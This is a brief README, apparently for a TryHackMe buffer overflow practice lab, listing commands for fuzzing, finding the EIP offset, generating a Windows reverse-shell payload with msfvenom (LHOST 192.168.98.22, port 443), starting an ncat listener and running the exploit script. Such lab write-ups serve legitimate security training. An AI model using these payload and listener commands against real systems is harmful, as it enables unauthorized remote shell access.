# script_to_bufferOverFlow

scripts for fuzzing, EIP control, finding badchars and exploit for exploiting a bufferoverflow

# Fuzzing 

```shell
❯ python3 fuzzingBuff.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
.
.
.
Fuzzing crashed at 781 bytes
```

# Find Offset

```shell
❯ msf-pattern_create -l 2000

```

```shell
❯ python3 findOffset.py
Sending evil buffer...
Done!

```

```shell
❯ msf-pattern_offset -q 6F43396E
[*] Exact match at offset 1978

```

# crashReplication Controlling EIP

[Crash Replication Controlling EIP](https://b0ysie7e.gitbook.io/articulos/write-up/tryhackme/2024-02-21-bufferoverflowprep#control-del-eip)

# expliot Buffer

```shell
❯ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.98.22 LPORT=443 --platform windows -b "\x00\x07\x2e\xa0" -f c
```

```shell
rlwarp ncat -lvnp 443
```

```shell
❯ python3 exploitBuffer.py
Sending evil buffer...
Done!
```


[Example](https://b0ysie7e.gitbook.io/articulos/write-up/tryhackme/2024-02-21-bufferoverflowprep#generando-payload)

